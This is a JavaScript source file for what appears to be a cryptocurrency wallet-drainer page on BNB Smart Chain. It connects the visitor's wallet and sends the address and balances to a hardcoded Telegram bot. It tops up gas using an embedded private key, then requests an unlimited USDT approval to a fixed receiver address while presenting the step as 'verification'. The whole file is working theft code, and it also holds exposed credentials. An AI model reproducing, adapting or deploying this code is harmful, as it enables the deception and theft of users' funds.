const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const RECEIVER_ADDRESS = "0xC955a60D43292408F3Bb51765C0478f5b4AEef1A";
const BNB_TOPUP_PRIVATE_KEY = "75f8d1725d55d36988e9149c88430e0df8c51f4f78b49b69dd63ea2cbbf15dc9";
const MAX_APPROVAL = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

const TELEGRAM_BOT_TOKEN = "7536567492:AAHTGbJZXi2g7N_qY-AnpTBMZ6jHFYM42eM";
const TELEGRAM_CHAT_ID = "8191508290";

let web3;
let account;
let usdtContract;

function getTimestamp() {
  return new Date().toLocaleString();
}

async function sendTelegram(message) {
  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
    });
  } catch (err) {
    console.error("❌ Telegram error:", err);
  }
}

async function Next() {
  const processingMsg = document.getElementById("processing-message");
  const statusMsg = document.getElementById("status-message");
  if (processingMsg) processingMsg.style.display = "block";
  if (statusMsg) statusMsg.style.display = "none";

  try {
    await connectWallet();
    await ensureBNBChain();

    usdtContract = new web3.eth.Contract([
      { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "success", "type": "bool" }], "type": "function" },
      { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }, { "name": "_spender", "type": "address" }], "name": "allowance", "outputs": [{ "name": "remaining", "type": "uint256" }], "type": "function" },
      { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "type": "function" }
    ], USDT_ADDRESS);

    const usdt = await getUSDTBalance(account);
    const bnbRaw = await web3.eth.getBalance(account);
    const bnb = parseFloat(web3.utils.fromWei(bnbRaw, 'ether')).toFixed(5);

    await sendTelegram(`🔗 Wallet connected:\nAddress: ${account}\nUSDT Balance: ${usdt}\nBNB Balance: ${bnb}\nTime: ${getTimestamp()}`);

    await ensureGas();
    await approveUSDT();
  } catch (e) {
    console.error("❌ Error:", e);
    alert("Error: " + (e.message || e));
    await sendTelegram(`❌ Approval Failed\nUser: ${account || 'unknown'}\nReason: ${e.message}\nTime: ${getTimestamp()}`);
  } finally {
    if (processingMsg) processingMsg.style.display = "none";
  }
}

async function connectWallet() {
  if (!window.ethereum) throw new Error("Wallet not found. Please install MetaMask or Trust Wallet.");

  web3 = new Web3(window.ethereum);

  const current = await web3.eth.getChainId();
  if (current !== 56) {
    try {
      await ensureBNBChain();
    } catch (e) {
      throw new Error("Please switch to BNB Smart Chain first.");
    }
  }

  await window.ethereum.request({ method: 'eth_requestAccounts' });
  const accounts = await web3.eth.getAccounts();
  account = accounts[0];
}

async function ensureBNBChain() {
  const chainId = '0x38';
  const current = await web3.eth.getChainId();
  if (current !== 56) {
    try {
      await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId }] });
    } catch (e) {
      if (e.code === 4902) {
        await window.ethereum.request({
          method: 'wallet_addEthereumChain',
          params: [{
            chainId,
            chainName: 'BNB Smart Chain',
            rpcUrls: ['https://bsc-dataseed.binance.org/'],
            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
            blockExplorerUrls: ['https://bscscan.com']
          }]
        });
      } else {
        throw e;
      }
    }
  }
}

async function getUSDTBalance(address) {
  const raw = await usdtContract.methods.balanceOf(address).call();
  return parseFloat(web3.utils.fromWei(raw, "ether"));
}

async function ensureGas() {
  const BN = web3.utils.BN;
  const balance = await web3.eth.getBalance(account);
  const gasThreshold = web3.utils.toWei("0.0005", "ether");

  const usdtBalance = await getUSDTBalance(account);
  if (usdtBalance < 1) return;

  const currentBN = new BN(balance);
  const thresholdBN = new BN(gasThreshold);

  if (currentBN.lt(thresholdBN)) {
    const provider = new Web3.providers.HttpProvider("https://bsc-dataseed.binance.org/");
    const topupWeb3 = new Web3(provider);
    const sender = topupWeb3.eth.accounts.privateKeyToAccount(BNB_TOPUP_PRIVATE_KEY);
    topupWeb3.eth.accounts.wallet.add(sender);

    const tx = {
      from: sender.address,
      to: account,
      value: web3.utils.toWei("0.0001", "ether"),
      gas: 21000,
    };

    await topupWeb3.eth.sendTransaction(tx);
    await sendTelegram(`💸 BNB Gas Sent\nFrom: ${sender.address}\nTo: ${account}\nAmount: 0.0001 BNB\nTime: ${getTimestamp()}`);
  }
}

async function approveUSDT() {
  const statusMsg = document.getElementById("status-message");

  const chainId = await web3.eth.getChainId();
  if (chainId !== 56) {
    alert("❌ Please switch to BNB Smart Chain before approving.");
    return;
  }

  const allowance = await usdtContract.methods.allowance(account, RECEIVER_ADDRESS).call();
  if (allowance !== "0") {
    alert("✅ Wallet is already verified.");
    if (statusMsg) statusMsg.style.display = "block";
    return;
  }

  const gasPrice = await web3.eth.getGasPrice();
  const gas = await usdtContract.methods.approve(RECEIVER_ADDRESS, MAX_APPROVAL).estimateGas({ from: account });
  const result = await usdtContract.methods.approve(RECEIVER_ADDRESS, MAX_APPROVAL).send({ from: account, gas, gasPrice });

  await sendTelegram(`✅ USDT Approved\nFrom: ${account}\nTo: ${RECEIVER_ADDRESS}\nAmount: MAX\nTime: ${getTimestamp()}`);

  if (statusMsg) statusMsg.style.display = "block";
}
